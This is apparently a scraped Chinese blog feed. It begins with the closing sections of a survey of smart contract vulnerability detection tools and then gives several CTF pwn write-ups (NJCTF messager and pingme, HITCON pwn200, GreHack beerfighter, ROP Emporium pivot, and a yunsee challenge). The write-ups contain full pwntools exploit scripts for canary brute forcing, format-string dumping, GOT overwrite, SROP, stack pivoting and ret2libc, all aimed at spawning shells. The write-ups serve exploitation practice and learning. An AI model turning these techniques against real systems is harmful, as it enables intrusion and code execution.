讨论与限制本研究全面回顾了用于检测和识别sc漏洞的工具，解决了区块链安全的一个重要方面。通过评估一系列方法中的256种工具，这项工作抓住了现有方法的优势和局限性，并确定了需要进一步关注的差距。下面的讨论探讨了这些工具如何应对漏洞检测的挑战，它们的结果揭示了该领域的当前状态，以及改进的机会在哪里。\n以往对SCs漏洞检测工具的调查往往提供了有限的分析，侧重于特定的工具，而没有建立它们之间、使用的方法和漏洞解决之间的明确联系。许多调查以一般术语讨论漏洞，但未能指定哪些工具能够检测它们，或者这些工具在有效性方面如何比较。此外，很少有调查对这些工具进行理论和实验比较，这对于了解它们的实际适用性和性能至关重要。有些人还忽略了关键的方法，或者只提到一般的方法，而没有探索工具和它们的方法之间的关系。这种全面评价的缺乏在文献中留下了严重的空白。本研究通过对工具进行分类、分析它们针对的漏洞、使用的方法、系统比较它们的理论基础和实验结果，解决了这些缺陷。通过解决这些差距，本研究提供了关键的见解，使其成为该领域的杰出贡献，并支持SCs漏洞检测的未来发展。\n本调查中的理论分析表明，不同的方法在解决SCs脆弱性方面的能力各不相同。诸如基于人工智能的方法、模糊测试、运行时验证、符号执行、形式化验证和模式匹配等技术显示了显著的多功能性。这些方法可以处理多个类别的漏洞，使它们对综合检测策略有效。它们的适应性使得它们在需要覆盖不同安全问题的场景中必不可少。\n相比之下，抽象解释、控制流分析、拆卸分析和可视化分析等方法的关注点受到限制。这些方法处理特定的漏洞类型，并且可能在分析中提供深度而不是广度。虽然它们在特定领域表现良好，但在处理地址和函数调用、可见性和作用域以及数学错误等问题时效率较低，这些问题仍然很少得到解决。这种不平衡的覆盖突出了现有方法的差距，强调了对综合方法的需要。整合不同技术的优势可以弥合这些差距，为SCs安全提供更强大、更有效的解决方案。\n在对Scs漏洞检测学术工具的理论比较中，出现了几个关键发现。这些工具在文档、自动化和可靠测试等领域表现出色，使它们成为推进研究的有力贡献者。然而，它们在灵活性、集成能力和可扩展性方面存在局限性，这限制了它们对不同工作流的适应性。静态工具通常缺乏自动化和广泛的覆盖，要求用户做手工工作。动态工具虽然具有实际应用的潜力，但需要更好的文档和与数据集更强的集成，以提高实际适用性。混合工具有效地结合了各种方法，但需要更大的灵活性和改进的集成，以适应广泛的研究和实际应用。应对这些挑战将使学术工具能够满足未来SCs安全的需求。\n用于sc漏洞检测的行业工具在自动化、文档化和覆盖方面表现出色，但往往缺乏灵活性、可用性和可修复性建议和可扩展性。静态工具如Slither和SmartCheck在自动化方面表现良好，但缺乏适应性和可扩展性。动态工具，如Manticore和Echidna，提供强大的测试和覆盖，但缺乏修复建议和详细的报告。混合工具结合了灵活性和可扩展性，但需要更好的可用性和文档。解决这些差距将有助于行业工具满足企业需求并提高SCs的安全性。\n在实验分析和比较中，从理论评估中选择的首选工具，观察到它们的能力差异。每种工具都有其独特的优点和缺点，并在检测准确性、执行速度、误报率和负报率方面进行了权衡。Slither和Vandal在执行速度方面表现出色，适合快速评估，但他们的低准确性限制了他们在详细分析方面的有效性。相比之下，Mythril、Manticore和sFuzz等工具实现了中等精度，但执行时间较长，突出了平衡效率和精度的挑战。这些工具都没有达到理想的权衡，强调需要进步或结合方法来提高覆盖率和准确性。\n此外，这些工具在多类分类方面也存在问题，因为与二元分类相比，它们的性能都出现了显著下降。Mythril是该类别中表现最好的工具，准确率仅为28.1%，这强调了识别特定漏洞的难度。特定漏洞的检出率也有很大差异。例如，Mythril在检测整数under&#x2F;overflow漏洞方面表现出色，而Slither在时间戳依赖和gas异常方面表现一般。相比之下，像Securify和Vandal这样的工具的检测率一直很低，限制了它们作为独立解决方案的实用性。这些发现强调了开发新工具或整合现有工具的优势并提高其准确性，速度和可靠性以满足现实世界sc安全需求的必要性。\n尽管sc漏洞检测工具取得了进步，但一些限制阻碍了它们的广泛采用。这些问题包括与准确性、效率、灵活性和可用性相关的问题，这些问题仍然是关键的障碍。这些限制可分为以下几类：\n\n高假阳性率和低多类分类准确率：许多工具使用保守的分析方法，导致高假阳性，需要大量的人工审查。由于某些漏洞类型的模式重叠和数据有限，准确的多类分类（对于识别一系列漏洞至关重要）仍然很困难。未来的研究应该探索先进的机器学习和人工智能，以更好地区分良性模式和真实威胁，改进分类模型，扩展标记数据集，以提高跨多个漏洞的准确性。\n长执行时间和有限的漏洞覆盖：像符号执行这样的技术，虽然彻底，但通常是资源密集型的，导致缓慢的处理时间不适合实时分析。此外，大多数工具都侧重于常见的漏洞，为更罕见或新出现的威胁留下了空白。研究人员可以探索混合方法，将符号执行与轻量级静态和动态分析相结合，以加快检测速度。通过集成人工智能、符号执行和正式验证来扩展检测方法也可以提高不同漏洞类型的覆盖率。\n有限的灵活性、集成和用户体验：许多学术工具是独立的解决方案，限制了它们的适应性和与其他安全系统或工作流集成的便利性。复杂的工作流程和有限的用户友好界面使非专业人员难以访问它们。未来的开发应该关注模块化、灵活的体系结构，支持插件扩展，增强适应性和集成。优先考虑以用户为中心的设计，使用直观的界面和改进的文档，可以在不牺牲技术深度的情况下使这些工具更容易访问。\n缺乏标准化的基准和数据集：缺乏普遍接受的基准和数据集使得很难客观地评估和比较工具，这影响了安全评估的一致性和透明度。建立标准化基准和管理数据集将实现更可靠的比较，促进创新，并在工具开发中实现严格的质量保证。\n漏洞的快速演变：区块链和sc景观正在迅速发展，迅速引入新的漏洞。这使得现有工具难以保持当前状态。为了跟上步伐，未来的研究应该集中在能够快速整合新威胁数据的自适应检测模型上，可能通过自动更新或在不断更新的数据集上训练机器学习模型。\n有限的补救指导：虽然许多工具有效地检测漏洞，但它们通常缺乏关于如何修复问题的可操作指导，使用户依赖于重要的专业知识。未来的工具应该优先考虑修复建议或自动缓解建议，可能使用人工智能生成特定于上下文的指导，帮助用户有效地解决漏洞。\n\n总之，虽然目前的工具已经取得了重大进展，但解决尚未解决的挑战对于提高其可靠性和实用性至关重要。未来的研究应侧重于提高检测精度，扩大漏洞覆盖范围，提供可操作的补救指导，并建立标准化的评估指标。这些进步对于制造这些工具至关重要。在研究和行业中更加强大、可扩展和可访问，最终加强SCs的安全实践。\n8 未来发展方向及研究问题SCs安全领域取得重大进展，但仍面临诸多挑战。这些挑战限制了当前工具的准确性、效率和可用性。解决这些问题对于跟上区块链技术及其漏洞的快速发展至关重要。本节强调了指导sc漏洞检测未来进展的重要问题。\n\n如何利用人工智能等技术降低误报率，提高多类分类检测漏洞的准确率？\n在改进对罕见和新出现漏洞的检测的同时，可以开发哪些混合方法来平衡彻底性和速度？\n如何设计具有用户友好界面的工具，以改进专家和非专家的集成、适应性和可访问性？\n可以使用哪些策略来创建标准化基准和数据集，以一致地评估漏洞检测工具？\n如何开发自适应检测模型来快速处理新的漏洞数据并跟上不断发展的区块链生态系统？\n如何使用人工智能和其他技术来提供有效的修复或缓解建议，以解决检测到的漏洞？\n\n总之，研究人员、行业专业人士和开发人员之间的合作对于克服现有的SCs安全挑战至关重要。协同工作可以开发出更准确、更高效、更易于使用的工具，同时跟上快速变化的bbb环境。这一共同努力将有助于确保南海的未来更安全、更可靠。\n9 结论本文调查了2018年至2024年间开发的256种工具，用于分析sc中的漏洞，并通过模糊测试和符号执行等方法对其进行分类。每个工具都根据其检测功能进一步分类，提供对特定应用程序的见解。该研究分解了每种工具可以检测到的漏洞类型，揭示了它们的覆盖范围和支持区块链安全的差距。评估是两层的：首先，一个理论分析，根据来源（学术或行业）和方法（静态、动态或混合）对工具进行分组，使用定制的评估标准。然后，在真实世界的数据集上对所选工具进行实验评估，这需要大量的时间和计算资源。\n研究结果揭示了不同工具的独特优势和劣势。学术工具优先考虑文档、灵活性和适应性，使它们适合不同的研究，而工业工具侧重于生产环境的速度和集成。Slither和Mythril等工具可以准确地检测到漏洞，但会遇到误报和速度较慢的问题。这些结果强调，尽管个别工具在特定领域表现出色，但没有一个工具能够完全覆盖漏洞。这凸显了在工具精度、执行速度和可靠性方面不断改进的需求，以有效地解决一系列SCs漏洞。\n总之，本调查为研究人员和从业人员提供了宝贵的资源，为SCs漏洞检测工具的现状提供了清晰的地图，确定了覆盖范围的差距，并提出了未来的改进建议。有了这些见解，我们计划开发一种解决这些限制的工具，旨在实现更高的准确性、更快的执行速度和更广泛的漏洞检测功能。这个工具将结合基于人工智能的技术和符号执行，以减少误报，提高多类分类的准确性。它还将解决未被充分代表的漏洞，例如地址和函数调用问题。此外，它将有一个用户友好的界面和可操作的维修建议，使其实际使用的现实世界。该工具旨在通过适应性强、高效和彻底来提高SCs的安全性，最终帮助区块链技术在快速变化的数字世界中更加可靠。\n","tags":["智能合约论文"]},{"title":"NJCTF2017-messager-wp","url":"/2025/11/18/NJCTF2017-messager-wp/","content":"NJCTF2017-messager-wp最近在看校友写的《CTF竞赛权威指南-pwn》，学习了爆破金丝雀的一个案例\n题目程序：https://github.com/D4rkD0g/REPL/blob/master/Canary/NJCTF2017_messager/messager\nwp首先，下载messager后，我们使用命令查看该程序的文件属性，发现是起用了Canary和NX的\npwn checksec messager\n\n直接运行发现报错找不到flag文件，我们手动生成一个flag（没有.txt）\necho &quot;flagxxxx&quot; &gt;&gt; flag\n\n再次运行成功启动。看上去是一个通信小程序。并且使用netstat -anp | grep “messager” 可以得知，它监听5555端口\n拖入ida，找到main函数，并f5查看伪代码。首先就发现第一个函数sub_400B76()，跟进去后发现它是读flag文件并进行了保存，保存在unk_602160\n然后就是常规的初始化操作。来到while(1)中，可以分析得出，这个程序每次接收到消息，就会调用一次fork\n\nfork函数每次调用就会产生一个子进程，这个子进程是父进程的一次自我复制，因此canary的值也是一样，并且子进程奔溃并不影响父进程，这是本题的核心\n\n继续分析，我们将发现sub_400BE9函数，跟进去后找到了出现栈溢出的代码\nbzero(s,0x64u); //清空100字节if((unsigned int)recv(fd,s,0x400u,0) == -1) //接收1024并放入相同缓冲区\n\n现在，我们又了栈溢出，知道flag在哪里，接下来就是要想办法读取flag。在ida中可以使用ctrl + x查看交叉引用（很多教程没写，导致我想了很久他们为什么突然跑去看sub_400BC6，太欺负新人了QAQ）。我们知道flag的位置，使用ida查看unk_602160的交叉引用，这时就看见了sub_400BC6这个函数中引用了这个地址，跟进去后，发现这个函数就是能输出flag。\n至此，我们的思路就是：通过不断的发送包，来爆破canary（因为父进程不受影响，子进程随便玩，同时canary的值始终是父进程一样的），找到后覆盖到sub_400BC6这个函数，输出flag\n由此，我们编写如下的脚本：python3\nfrom pwn import *canary = b&#x27;\\x00&#x27;padding = b&quot;a&quot; * 104for x in range(7):\tfor y in range(256):\t\tp = remote(&quot;127.0.0.1&quot;,5555)\t\tprint(p.recv().decode(&quot;latin-1&quot;))\t\tp.send(padding + canary + byte([y]))\t\ttry:\t\t\tinfo = p.recv()\t\t\tprint(info.decode(&quot;latin-1&quot;))\t\texcept:\t\t\tp.close()\t\t\tcontinue\t\tp.close()\t\tbreak\tcanary += byte([y])print(&quot;get it&quot;)print(canary.hex())\n\n\n这里如果有同学和我一样好奇，可能会问？为什么金丝雀是随机7位（最低位固定为\\x00），但是这里爆破却是逐字节？不应该直接爆破8字节吗？\n这时由于金丝雀本身特性导致：\n内存布局：缓冲区+canary0+canary1…..+EBP+返回地址。\n我们爆破实际上是直接覆盖金丝雀，以第一位为例，我们猜a的时候，后面的位是没变的，所以，当第一位正确后，我们固定他，接着猜第二位，其他位的金丝雀依然没被覆盖是正确的。由此可以猜出整个canary的值\n\n利用exp：\n#将上面的得到的canary覆盖from pwn import *canary = b&quot;&quot; #你的值padding = b&quot;a&quot; *104p = remote(&quot;127.0.0.1&quot;,5555)p.recv()payload = padding + canary + b&quot;a&quot; *8 + p64(400BC6) # 8个a覆盖ebpp.send(payload)print(p.recv().decode(&quot;latin-1&quot;)) \n","tags":["PWN"]},{"title":"hitcon2017-pwn200","url":"/2025/11/20/hitcon2017-pwn200/","content":"HITCON CMT 2017: pwn200本题目主要是结合格式化字符串泄漏canary，然后再利用栈溢出导致任意函数执行。相对简单，因为题目给了system，而不用自己再去找libc。\nwp题目源码：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void canary_protect_me(void) &#123;        system(&quot;/bin/sh&quot;);&#125;int main(void) &#123;        setvbuf(stdout, 0LL, 2, 0LL);        setvbuf(stdin, 0LL, 1, 0LL);        char buf[40];        gets(buf);        printf(buf);           \t\t\t// format string        gets(buf);                      // buf overflow        return 0;&#125;\n\n将题目编译成NX+ canary+relro开启状态，以及32位\ngcc -m32 -fstack-protector -no-pie -z lazy -Wno-implicit-funcion-declaration pwn200.c -o pwn200\n\n老规矩首先看看文件属性：pwn checksec pwn200。可以看到开启了上述属性\n通过阅读源代码，我们可以看出存在格式化字符串的问题，以及栈溢出。但是由于开启了canary，我们需要确定它的值。\n我们可以选择直接break 在main函数，这样能够看到main 函数的canary装入 gs:0x14 并放在ebp-0xc的位置（这里每个机器都不一样，需要按照自己实际的来）\n我们再下个断点在printf函数，输入aaaa后，查看堆栈，发现aaaa在第6个参数（0开始）上，而同时查看canary的位置，x $ebp-0xc，发现在第15的位置。\n我们直接使用格式化字符串打印它的值：%15$x.\n那么接下来就是找到canary_protect_me函数的位置，在程序中：p canary_protect_me，得到位置\n计算填充：输入的位置-canary &#x3D; 40个字节&#x3D;0x28 canary覆盖到ebp &#x3D; 0xC，最后将函数地址放在ebp+4上\n完整的payload：\nfrom pwn import *io = process(&quot;./pwn200&quot;)io.sendline(&quot;%15$x&quot;)canary = int(io.recv(),16)sys = 0x80491a6payload = b&quot;A&quot; * 0x28 + p32(canary) + b&quot;b&quot;* 0xC + p32(sys)io.sendline(payload)io.interactive()\n","tags":["PWN"]},{"title":"njctf2017-pingme","url":"/2025/11/21/njctf2017-pingme/","content":"NJCTF2017-pingme这个题目还挺有意思，我们需要在没有二进制文件，只有端口和ip的情况下进行pwn。\n核心思路：\n1.判断是什么类型：栈溢出、格式字符串等2.获取类型后，发现是格式字符串，利用该漏洞进行二进制dump3.dump后就能获取printf的文件地址，可以泄漏对应的got。4.要么在libc-database中查、要么使用DynELF在没有获得libc信息时利用5.覆盖printf_got，使用system函数\n\nWP首先，我们拿到二进制文件后，在本地起进程，若读者使用的是靶场，应该能直接访问端口，不需要本地启动。\n访问后，随便输几个字，发现会回显。需要猜测是什么类型的漏洞，输入格式化字符串尝试打印17位的参数%17$p，成功打印了。可以得知这里是格式化字符串漏洞。\n那么，接着需要找到格式化字符串所在的参数位置。使用FmtStr自动化完成\nfrom pwn import *def exec_fmt(payload)\tio.sendline(payload)\tinfo = io.recv()\treturn infoauto = FmtStr(exec_fmt)offset = auto.offsetprint(offset)\n\n找到了参数位置在第7位。接着我们利用这个位置进行dump二进制\nfrom pwn import *def dump_memory(start_addr,end_addr):    result = b&quot;&quot;    while(start_addr &lt; end_addr):        p = remote(&#x27;127.0.0.1&#x27;,&#x27;10001&#x27;)        p.recvline()        payload = b&quot;%9$s.AAA&quot;+p32(start_addr) #需要理解一下这里的思想，我们从开始地址进行读，因为前面的内容占了8个字节刚好2个参数的位置，所以我们从第9个参数开始作为写入地址        p.sendline(payload)        data = p.recvuntil(&quot;.AAA&quot;)[:-4] #每读一个地址的内容后，堆栈后面是.AAA，因此反向取除了.AAA以外的内容        if data == b&quot;&quot;:            data = b&quot;\\x00&quot;        result += data        start_addr +=len(data)        p.close()    return resultstart_addr = 0x08048000 #没开启随机化的情况下开始地址end_addr = 0x08049000\t#这个程序读0x1000就够了code_bin = dump_memory(start_addr,end_addr)with open(&quot;code.bin&quot;, &quot;wb&quot;) as f:    f.write(code_bin)    f.close()\n\n上面的代码能够获得一个code_bin的二进制，是源程序的内存镜像，我们可以通过readelf分别读到printf的文件地址和程序的入口地址。\n我们利用这个printf的文件地址，查询printf的实际内存地址\nfrom pwn import * printf_got = 0x08049974 # readelf查到的地址def get_printf_addr():    p = remote(&#x27;127.0.0.1&#x27;,&#x27;10001&#x27;)    p.recvline()    payload = b&quot;%9$s.AAA&quot; + p32(printf_got)    p.sendline(payload)    data = p.recvuntil(&quot;.AAA&quot;)[:4]    return dataprintf_addr = get_printf_addr()print(printf_addr.hex())\n\n现在就有两种方法了，一种是直接下载libc-database然后本地查询，一种是利用DynElF查\nlibc的查询办法：\n\n.&#x2F;find printf 620 # 这里620是上面脚本查到的printf@got内存地址的小端3位\n.&#x2F;dump xxxxx 上面查到的。这里就能查到对应的system的偏移。\n\nfrom pwn import *io = remote(&#x27;127.0.0.1&#x27;,&#x27;10001&#x27;)printf_got = 0x08049974global printf_addrglobal system_addrdef method_1(io):    libc = ELF(&#x27;/home/hack/Desktop/libc-database-master/db/libc6_2.42-2ubuntu2_i386.so&#x27;)    global  system_addr    def get_printf_addr():        io.recvline()        payload = b&quot;%9$s.AAA&quot; + p32(printf_got)        io.sendline(payload)        data = u32((io.recvuntil(&quot;.AAA&quot;)[:4]))        return data    printf_addr = get_printf_addr()    system_addr = printf_addr - (libc.sym[&#x27;printf&#x27;] - libc.sym[&#x27;system&#x27;])def method_2_dynelf(addr):    # using in not have libc version information    io.recvline()    payload = b&quot;%9$s.AAA&quot; + p32(addr)    io.sendline(payload)    data = io.recvuntil(&quot;.AAA&quot;)[:-4] + b&#x27;\\x00&#x27;    return dataif __name__ == &#x27;__main__&#x27;:    method_1(io)    #data = DynELF(method_2_dynelf, 0x8048490) #这里的地址就是上面利用readelf -h查到的入口地址    #system_addr = data.lookup(&quot;system&quot;,&quot;libc&quot;)    payload = fmtstr_payload(7,&#123;printf_got : system_addr&#125;)    io.recvline()    io.sendline(payload)    io.recv()    io.sendline(&quot;/bin/sh&quot;)         io.interactive()  \n\n当然也可以合并成一个脚本文件。\n","tags":["PWN"]},{"title":"grehack-ctf-2017_beerfighter","url":"/2025/11/23/grehack-ctf-2017-beerfighter/","content":"GreHack-CTF-2017_beerfighter这个题目主要难点在于结合SROP以及栈转移，需要构造两次SROP来完成。\nWP1.老规矩还是首先看程序的二进制属性，发现只是个静态链接的二进制。\n2.使用ida分析后，发现在sub_400568函数中存在栈溢出。分配大小为0x410，但是复制过去2048\n3.可以简单的使用一下程序，发现只有在功能1，才有输入角色名的功能，也就是漏洞出现在这里\n4.进一步可以发现在该程序中 .data段可写，也存在 pop rax; ret、syscall; ret的gadgets，可用构造 sigreturn用来实现SROP\nfrom pwn import * p = process(&quot;./beerfighter&quot;)elf = ELF(&#x27;./beerfighter&#x27;)context.arch = &quot;amd64&quot;p.recvuntil(&quot;Type your action number &gt; &quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Type your action number &gt; &quot;)p.sendline(&quot;0&quot;)p.recvuntil(&quot;Type your character name here &gt; &quot;)# 输入名称这里存在漏洞pop_rax = 0x000000000040077a # pop rax; retsyscall_addr = 0x0000000000400738 # syscall# 为什么要这么构造？中间这里是0xf，也就是read的调用号，要使用系统调用需要给调用号，第一句pop_rax，将调用号保存在了rax中，然后ret会将程序执行到syscall_addr指向的地址#即，先溢出，rbp-8的位置是pop rax，然后函数返回地址就会执行pop rax。rsp此时指向的是RBP-16sigreturn = p64(pop_rax) + p64(constants.SYS_rt_sigreturn) + p64(syscall_addr)payload = b&quot;A&quot;*1048 + sigreturn# 这里是指定.data中data_addr = elf.get_section_by_name(&quot;.data&quot;).header.sh_addr + 0x20new_stack_addr = data_addr + 0x8# 一阶段的frame构造：执行syscall时，内核会在用户空间上读取ucontext结构体，用这个结构体里的数据完全覆盖所有寄存器。而这个结构体就在syscall下一行，执行了ret后，rsp是直接指向结构体第一行的frame_read = SigreturnFrame(kernel=&quot;amd64&quot;) #指定内核frame_read.rax = constants.SYS_read # rax保存着调用号frame_read.rdi = constants.STDIN_FILENO #标准输入，rdi保存从哪里开始读frame_read.rsi = data_addr #rsi保存 写到哪里frame_read.rdx = len(frame_execve) #rdx保存读入的字节数frame_read.rsp = new_stack_addr # 将rsp定位到新栈的sigreturn，等到syscall执行完成后，将会从这里继续执行frame_read.rip = syscall_addr #rip指到syscall# 2阶段的frame：从新栈中读出/bin/sh，然后执行frame_execve = SigreturnFrame(kernel = &quot;amd64&quot;)frame_execve.rax = constants.SYS_execveframe_execve.rdi = data_addrframe_execve.rsi = 0frame_execve.rdx = 0frame_execve.rip = syscall_addr#首先，发送第一段payload，执行后，syscall会执行read，等待输入，会将输入写到.datap.sendline(payload + bytes(frame_read))p.recvuntil(&quot;Type your action number &gt; &quot;)p.sendline(&quot;3&quot;)#发送第二段payload，被写到指定位置，此时第一阶段已经指定了rip、rsp，所以，依然是执行的syscall，然后由于rsp指向的sigreturn，又开始执行sigreturnpayload = b&quot;/bin/sh\\x00&quot; + sigreturn + bytes(frame_execve)p.sendline(payload)p.interactive()\n","tags":["PWN"]},{"title":"rop-Emporium-pivot","url":"/2025/11/23/rop-Emporium-pivot/","content":"ROP_Emporium 挑战之pivot本挑战分为64位和32位的，核心思路是由于溢出的空间不足，因此需要使用stack pivoting的技术进行栈转移，将程序流转移到足够我们利用的空间\nwp32位pivot1.我们拿到程序后，首先还是检查他的二进制文件的保护设置，题目给了3个文件，分别是flag、lib和二进制程序，我们查看二进制程序发现只开启了NX，而lib开启了随机化。\n2.使用ida查看后，发现在pwnme函数中存在栈溢出。\n3.运行程序，使用pwngdb检查溢出大小，根据cyclic判断出溢出大小是44，且程序第一步让我们向一个开辟的堆空间中写入任意值\n4.要利用stack pivoting，我们可以将构造的栈放在第一步中，我们的目标是调用ret2win函数，但是我们并不知道这个函数在内存中的位置，同时，lib中还有一个函数foothold_function函数，我们可以利用got泄漏这个函数的地址，然后通过计算相对偏移，得到ret2win的位置，再最后调用ret2win。（注意：这里所有的工作都在我们预构造的栈中执行。因此我们要找到多个gadgets来辅助我们完成这个工作）\n5.构造好后，就是简单的利用，溢出后覆盖ebp地址为我们写入栈的地址，然后通过leave；ret的功能跳转过去执行\nfrom pwn import *context.arch = &quot;i386&quot;context.bits = 32context.os = &quot;linux&quot;context.log_level = &#x27;debug&#x27;io = process(&#x27;./pivot32&#x27;)elf = ELF(&#x27;./pivot32&#x27;)lib = ELF(&#x27;./libpivot32.so&#x27;)#这下面的均是需要使用ROPgadgets工具或者pwngdb中的rop功能查找的leave_ret = 0x080485f5 # leave;retpop_eax = 0x0804882c # pop eax; retpop_ebx = 0x0804889b # pop ebx; retmov_eax_eax = 0x08048830 # mov eax, dword ptr [eax] ; retadd_eax_ebx = 0x08048833 # mov eax,ebx ; retcall_eax = 0x080485f0 # call eaxfoothold_plt = elf.plt[&#x27;foothold_function&#x27;]foothold_got = elf.got[&#x27;foothold_function&#x27;]offset = int(lib.sym[&#x27;ret2win&#x27;] - lib.sym[&#x27;foothold_function&#x27;])leak_addr = int(io.recv().split()[20],16)def payload_1():# 核心思路：1.执行foothold函数的plt后，由于延迟绑定，此时foothold_got会指向真正的函数地址了# 2. pop eax 是将got的地址存放到eax中，而mov eax eax，是取出eax（got）指向的地址，给到eax，也就是现在eax就等于footh函数地址# 3.将偏移取出给到ebx，然后将eax + ebx == 函数真实地址+ （两个函数相对地址的差值）== 对应函数在内存中的真实地址# 4.调用eax，此时eax就是你想访问的函数的真实地址    payload = p32(foothold_plt)    payload += p32(pop_eax)    payload += p32(foothold_got)    payload += p32(mov_eax_eax)    payload += p32(pop_ebx)    payload += p32(offset)    payload += p32(add_eax_ebx)    payload += p32(call_eax)    io.sendline(payload)def payload_2():    payload = b&quot;A&quot;*40     payload += p32(leak_addr - 4) # ebp ，因为程序真实偏移为44，40为a，40-44是ebp    payload += p32(leave_ret)   #ebp-4    io.sendline(payload)    io.recvuntil(&quot;ROPE&quot;)    print(io.recvall())if __name__ == &#x27;__main__&#x27;:    payload_1()    payload_2()\n\n64位：与上面的思路基本相同，只是要注意不是4位大小，而是8位，同时要修改对应的gadgets\nfrom pwn import *context.arch = &quot;amd64&quot;context.bits = 64context.os = &quot;linux&quot;io = process(&#x27;./pivot&#x27;)elf = ELF(&#x27;./pivot&#x27;)lib = ELF(&#x27;./libpivot.so&#x27;)leave_ret = 0x00000000004008ef # leave;retpop_rax = 0x00000000004009bb # pop rax; retpop_rbp = 0x00000000004007c8 # pop rbp ; retmov_rax_rax = 0x00000000004009c0 # mov rax, qword ptr [rax] ; retadd_rax_rbp = 0x00000000004009c4 # add rax, rbp ; retcall_rax = 0x00000000004006b0 # call raxfoothold_plt = elf.plt[&#x27;foothold_function&#x27;]foothold_got = elf.got[&#x27;foothold_function&#x27;]offset = int(lib.sym[&#x27;ret2win&#x27;] - lib.sym[&#x27;foothold_function&#x27;])leak_addr = int(io.recv().split()[20],16)def payload_1():    payload = b&quot;A&quot; * int(context.bits/8)    payload += p64(foothold_plt)    payload += p64(pop_rax)    payload += p64(foothold_got)    payload += p64(mov_rax_rax)    payload += p64(pop_rbp)    payload += p64(offset)    payload += p64(add_rax_rbp)    payload += p64(call_rax)    io.sendline(payload)g_nBufOverflowIndex = 0x28def payload_2():    payload = b&quot;A&quot; * 32    payload += p64(leak_addr) # ebp    payload += p64(leave_ret)   #ebp-4    io.sendline(payload)    io.recvuntil(&quot;ROPE&quot;)       print(io.recv(timeout=10))if __name__ == &#x27;__main__&#x27;:    payload_1()    payload_2()\n","tags":["PWN"]},{"title":"yunsee入群测试","url":"/2025/11/23/yunsee%E5%85%A5%E7%BE%A4%E6%B5%8B%E8%AF%95/","content":"前几天无意看到一个公众号文章，看到博主在招新，但是进群有验证，验证码需要提交flag。访问这个ip发现是个靶场，我刚好在学pwn，为了检验自己学的咋样顺便就做了pwn的题。\nWP这题给我好好的上了一课，由于学了很多高级手法，总想着用什么高深的技术来解决，但其实往往需要回归本质来看待问题，许多你认为的东西需要不断的实践才能出真知。\n1.老样子，查看文件的属性，发现并没有什么特殊属性，也没开canary，64位程序\n2.使用ida查看文件。有很明显的一个vuln函数，里面进行了read（），有个很简单的栈溢出（这里有个坑点，我用ida看到的堆栈大小为112，但是实际溢出需要120，还是需要进gdb动态的调试）\n3.我们可以简单的利用ret2libc来获取shell，然后读取服务器上的flag文件。\n4.如何做？1.首先我们利用puts函数打印出read函数的内存真实地址，2.利用read函数的真实地址计算libc的真实地址，以及system的位置，&#x2F;bin&#x2F;sh的位置3.再次构造payload，执行&#x2F;bin&#x2F;sh\n坑点：1.这里获取真实地址的规则需要自己看着写，我找了很多可能出错的地方，唯一没想到这里有问题，忙了半天，我说咋一直获取不到真实地址，不能直接照搬别人的（因为他每次都要输出个Can you get it，而我们的地址在这之后）2.libc文件需要使用文件夹中的libc.so.6，不然会存在些许偏移的误差导致后面的payload失效。3.每次发送payload之前需要发送一次菜单选择4.本地调试的时候要记得改一下libc为ldd查出来的\n完整exp：\nfrom pwn import *libc = ELF(&#x27;/home/hack/Downloads/1763395387_yunseepwn1/yunseepwn1/libc.so.6&#x27;)#libc = ELF(&#x27;./libc.so&#x27;)elf = ELF(&#x27;./attachment&#x27;)#p = process(&#x27;./attachment&#x27;)p = remote(&quot;134.209.170.53&quot;,&#x27;11001&#x27;)pop_rdi_ret_addr = 0x401212read_got = elf.got[&#x27;read&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main_addr = elf.symbols[&#x27;_start&#x27;]offset = 120payload = b&quot;a&quot; * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(read_got)payload += p64(puts_plt)payload += p64(main_addr)#attach(p,&quot;b *0x40121e&quot;)#pause()p.sendlineafter(b&quot;&gt;&quot;, b&quot;1&quot;)p.send(payload)output =p.recvn(50)print(output)def extract_address_manual(data):    # 输出格式: b&#x27;&gt; \\nCan you got it?\\n\\x90\\x7f\\xd2\\xf7\\xff\\x7f\\n1.Input ...&#x27;    lines = data.split(b&#x27;\\n&#x27;)      # 地址应该在 &quot;Can you got it?&quot; 之后的那一行    for i, line in enumerate(lines):        if b&#x27;Can you got it?&#x27; in line and i + 1 &lt; len(lines):            address_line = lines[i + 1]            if len(address_line) &gt;= 6:                # 取前6个字节                addr = u64(address_line[:6].ljust(8, b&#x27;\\x00&#x27;))                if 0x7f0000000000 &lt; addr &lt; 0x800000000000:                    return addr    return Noneread_real_addr = extract_address_manual(output)print(&quot;read_real_addr: &quot;, hex(read_real_addr))libc_base = read_real_addr - libc.sym[&quot;read&quot;]print(&quot;libc_base: &quot;, hex(libc_base))system_addr = libc_base + libc.sym[&quot;system&quot;]binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))print(&quot;system_addr:&#123;&#125;&quot;.format(hex(system_addr)))print(&quot;binsh_addr:&#123;&#125;&quot;.format(hex(binsh_addr)))payload = b&quot;a&quot; * offsetpayload += p64(0x40101a) #这里用来对齐payload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.sendlineafter(b&quot;&gt;&quot;, b&quot;1&quot;)p.send(payload)p.interactive()\n\n也感谢这道题目。虽然很基础，但是确实的让我体会到了基础的重要性，帮我巩固了x86，x64的堆栈相关的知识，在完成后也有很多收获\n链接：http://47.105.72.130/\n","tags":["PWN"]}]